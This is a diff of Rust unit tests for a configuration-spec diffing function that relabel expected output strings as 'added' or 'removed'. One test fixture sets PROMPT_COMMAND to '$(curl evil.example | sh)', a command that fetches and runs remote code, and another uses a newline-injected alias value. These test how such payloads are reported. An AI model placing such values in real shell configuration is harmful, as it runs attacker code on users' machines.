@@ -1640,17 +1640,17 @@ fn diff_module_specs_detects_changes() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("dependency: dep2"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("dependency added: dep2"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("package: pkg3"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("package added: pkg3"))
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("package: pkg2"))
+            .any(|(role, c)| *role == Role::Fail && c.contains("package removed: pkg2"))
     );
     assert!(
         changes
@@ -2134,11 +2134,11 @@ fn diff_module_specs_reports_env_additions_removals_and_edits() {
 
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&(Role::Ok, "env: ADDED=y".to_string())),
+        changes.contains(&(Role::Ok, "env added: ADDED=y".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Fail, "env: GONE=x".to_string())),
+        changes.contains(&(Role::Fail, "env removed: GONE=x".to_string())),
         "{changes:?}"
     );
     assert!(
@@ -2159,11 +2159,11 @@ fn diff_module_specs_reports_alias_additions_removals_and_edits() {
 
     let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&(Role::Ok, "alias: added=bat".to_string())),
+        changes.contains(&(Role::Ok, "alias added: added=bat".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Fail, "alias: gone=cat".to_string())),
+        changes.contains(&(Role::Fail, "alias removed: gone=cat".to_string())),
         "{changes:?}"
     );
     assert!(
@@ -2191,12 +2191,12 @@ fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
     assert!(
         changes.contains(&(
             Role::Ok,
-            "env: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()
+            "env added: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()
         )),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&(Role::Ok, "alias: ls=line-one\nline-two".to_string())),
+        changes.contains(&(Role::Ok, "alias added: ls=line-one\nline-two".to_string())),
         "{changes:?}"
     );
 }
@@ -2342,7 +2342,7 @@ fn diff_module_specs_added_dependency() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("dependency: core"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("dependency added: core"))
     );
 }
 
@@ -2358,7 +2358,7 @@ fn diff_module_specs_removed_dependency() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("dependency: core"))
+            .any(|(role, c)| *role == Role::Fail && c.contains("dependency removed: core"))
     );
 }
 
@@ -2377,7 +2377,7 @@ fn diff_module_specs_added_package() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("package: ripgrep"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("package added: ripgrep"))
     );
 }
 
@@ -2396,7 +2396,7 @@ fn diff_module_specs_removed_package() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c.contains("package: vim"))
+            .any(|(role, c)| *role == Role::Fail && c.contains("package removed: vim"))
     );
 }
 
@@ -2448,7 +2448,7 @@ fn diff_module_specs_added_file() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c.contains("file target: ~/.zshrc"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("file target added: ~/.zshrc"))
     );
 }
 
@@ -4235,13 +4235,14 @@ fn diff_module_specs_file_changes() {
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Ok && c == "file target: ~/.config/app/new.conf"),
+            .any(|(role, c)| *role == Role::Ok && c == "file target added: ~/.config/app/new.conf"),
         "should show added file: {joined}"
     );
     assert!(
         changes
             .iter()
-            .any(|(role, c)| *role == Role::Fail && c == "file target: ~/.config/app/old.conf"),
+            .any(|(role, c)| *role == Role::Fail
+                && c == "file target removed: ~/.config/app/old.conf"),
         "should show removed file: {joined}"
     );
     // shared.conf should NOT appear in changes
@@ -4287,8 +4288,8 @@ fn diff_module_specs_env_only_change_is_still_a_change() {
     assert_eq!(
         changes,
         vec![
-            (Role::Ok, "env: NEW=2".to_string()),
-            (Role::Fail, "env: OLD=1".to_string()),
+            (Role::Ok, "env added: NEW=2".to_string()),
+            (Role::Fail, "env removed: OLD=1".to_string()),
         ]
     );
 }
